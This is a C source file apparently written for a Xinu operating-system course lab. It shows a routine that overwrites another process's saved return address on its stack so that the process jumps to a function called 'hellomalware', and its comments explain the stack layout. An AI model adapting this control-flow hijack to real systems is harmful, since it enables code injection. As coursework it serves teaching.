/* attackerA.c - attackerA */

#include <xinu.h>

/*------------------------------------------------------------------------------
 * attackerA - attack pid [getpid() - y]
 *              Created by cohen50 Lab4 - overt attack
 *------------------------------------------------------------------------------
 */

void attackerA(int y) {
  pid32 attack_pid = getpid() - y;

  if (isbadpid(attack_pid)) {
    kprintf("bad pid - attackerA failed\n");
    return;
  }

  uint32 *stkptr = (uint32 *) proctab[attack_pid].prstkptr;

  // Overwrite return address of attack_pid's stack to 'hellomalware'
  // skip over 10 places in the stack (all 8 registers pushed by 'pushal',
  //                                   EFLAGS, and old EBP) to get to EIP.
  stkptr += 10;
  *stkptr = (long)hellomalware;
}
